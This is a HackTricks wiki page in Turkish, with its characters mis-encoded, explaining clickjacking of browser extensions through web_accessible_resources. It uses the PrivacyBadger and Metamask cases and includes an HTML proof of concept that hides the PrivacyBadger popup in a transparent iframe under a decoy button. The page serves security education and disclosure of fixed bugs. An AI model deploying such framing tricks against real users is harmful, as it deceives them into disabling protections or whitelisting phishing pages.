# BrowExt - ClickJacking

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanla Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Temel Bilgiler

Bu sayfa, bir TarayÄ±cÄ± eklentisindeki ClickJacking zafiyetini istismar edecektir.\
ClickJacking nedir bilmiyorsanÄ±z, ÅŸu adrese bakÄ±n:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

UzantÄ±lar, **`manifest.json`** adlÄ± bir dosyayÄ± iÃ§erir ve bu JSON dosyasÄ±nda **`web_accessible_resources`** alanÄ± bulunur. Ä°ÅŸte [Chrome belgelerinde](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) bununla ilgili sÃ¶ylenenler:

> Bu kaynaklar, **`chrome-extension://[PAKET KÄ°MLÄ°ÄÄ°]/[YOL]`** URL'si aracÄ±lÄ±ÄŸÄ±yla bir web sayfasÄ±nda kullanÄ±labilir hale gelir ve bu URL, **`extension.getURL`** yÃ¶ntemiyle oluÅŸturulabilir. Ä°zin verilen kaynaklar, uygun CORS baÅŸlÄ±klarÄ±yla sunulduÄŸundan, XHR gibi mekanizmalar aracÄ±lÄ±ÄŸÄ±yla kullanÄ±labilir.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

TarayÄ±cÄ± uzantÄ±sÄ±ndaki **`web_accessible_resources`**, sadece web Ã¼zerinden eriÅŸilebilir olmakla kalmaz, aynÄ± zamanda uzantÄ±nÄ±n doÄŸal yetkileriyle Ã§alÄ±ÅŸÄ±r. Bu, ÅŸunlarÄ± yapabilme yeteneÄŸine sahip olduklarÄ± anlamÄ±na gelir:

- UzantÄ±nÄ±n durumunu deÄŸiÅŸtirme
- Ek kaynaklar yÃ¼kleme
- TarayÄ±cÄ±yla belirli bir Ã¶lÃ§Ã¼de etkileÅŸimde bulunma

Ancak, bu Ã¶zellik bir gÃ¼venlik riski oluÅŸturur. **`web_accessible_resources`** iÃ§indeki bir kaynak Ã¶nemli bir iÅŸlevselliÄŸe sahipse, saldÄ±rgan bu kaynaÄŸÄ± harici bir web sayfasÄ±na gÃ¶mebilir. Bu sayfayÄ± ziyaret eden dikkatsiz kullanÄ±cÄ±lar, bu gÃ¶mÃ¼lÃ¼ kaynaÄŸÄ± yanlÄ±ÅŸlÄ±kla etkinleÅŸtirebilir. UzantÄ±nÄ±n kaynaklarÄ±nÄ±n izinleri ve yeteneklerine baÄŸlÄ± olarak, bu etkinleÅŸtirme istenmeyen sonuÃ§lara yol aÃ§abilir.

## PrivacyBadger Ã–rneÄŸi

PrivacyBadger uzantÄ±sÄ±nda, `skin/` dizininin aÅŸaÄŸÄ±daki ÅŸekilde **`web_accessible_resources`** olarak bildirildiÄŸi bir zafiyet tespit edildi (Orijinal [blog yazÄ±sÄ±na](https://blog.lizzie.io/clickjacking-privacy-badger.html) bakÄ±n):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Bu yapÄ±landÄ±rma potansiyel bir gÃ¼venlik sorununa yol aÃ§tÄ±. Ã–zellikle tarayÄ±cÄ±daki PrivacyBadger simgesiyle etkileÅŸim sonucu oluÅŸturulan `skin/popup.html` dosyasÄ±, bir `iframe` iÃ§ine yerleÅŸtirilebilir. Bu yerleÅŸtirme, kullanÄ±cÄ±larÄ± "Bu Web Sitesi iÃ§in PrivacyBadger'Ä± Devre DÄ±ÅŸÄ± BÄ±rak" seÃ§eneÄŸine yanlÄ±ÅŸlÄ±kla tÄ±klamaya kandÄ±rmak iÃ§in istismar edilebilir. Bu eylem, kullanÄ±cÄ±nÄ±n gizliliÄŸini tehlikeye atarak PrivacyBadger korumasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r ve kullanÄ±cÄ±yÄ± artan takibe maruz bÄ±rakabilir. Bu saldÄ±rÄ±nÄ±n gÃ¶rsel bir Ã¶rneÄŸi, [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) adresindeki ClickJacking video Ã¶rneÄŸinde gÃ¶rÃ¼lebilir.

Bu zafiyeti gidermek iÃ§in basit bir Ã§Ã¶zÃ¼m uygulandÄ±: `web_accessible_resources` listesinden `/skin/*` kaldÄ±rÄ±ldÄ±. Bu deÄŸiÅŸiklik, `skin/` dizininin web eriÅŸilebilir kaynaklar aracÄ±lÄ±ÄŸÄ±yla eriÅŸilemez veya manipÃ¼le edilemez olmasÄ±nÄ± saÄŸlayarak riski etkin bir ÅŸekilde azalttÄ±.

DÃ¼zeltme kolaydÄ±: **`web_accessible_resources` iÃ§inden `/skin/*` kaldÄ±rÄ±ldÄ±**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Ã–rneÄŸi

[**Metamask'ta bir ClickJacking hakkÄ±nda bir blog yazÄ±sÄ± burada bulunabilir**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Bu durumda, Metamask, eriÅŸim iÃ§in kullanÄ±lan protokolÃ¼n **`https:`** veya **`http:`** olduÄŸunu kontrol ederek (Ã¶rneÄŸin **`chrome:`** deÄŸil):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Metamask uzantÄ±sÄ±nda baÅŸka bir ClickJacking hatasÄ± da dÃ¼zeltildi. KullanÄ±cÄ±lar, bir sayfanÄ±n dolandÄ±rÄ±cÄ±lÄ±k olabileceÄŸi ÅŸÃ¼phesiyle karÅŸÄ±laÅŸtÄ±ÄŸÄ±nda **TÄ±klama ile beyaz listeye ekleme** yapabiliyorlardÄ±. Ã‡Ã¼nkÃ¼ `â€œweb_accessible_resourcesâ€: [â€œinpage.jsâ€, â€œphishing.htmlâ€]` ifadesi nedeniyle bu sayfa Clickjacking'e karÅŸÄ± savunmasÄ±zdÄ±. Bir saldÄ±rgan, kurbanÄ±n fark etmeden beyaz listeye eklemek iÃ§in normal bir ÅŸey gÃ¶stererek onu kullanabilirdi ve ardÄ±ndan beyaz listeye alÄ±nan sahte sayfaya geri dÃ¶nebilirdi.

## Steam Inventory Helper Ã–rneÄŸi

Bir tarayÄ±cÄ± uzantÄ±sÄ±ndaki bir **XSS** ile bir **ClickJacking** aÃ§Ä±ÄŸÄ± nasÄ±l birleÅŸtirildiÄŸini kontrol etmek iÃ§in aÅŸaÄŸÄ±daki sayfaya bakÄ±n:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Referanslar

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
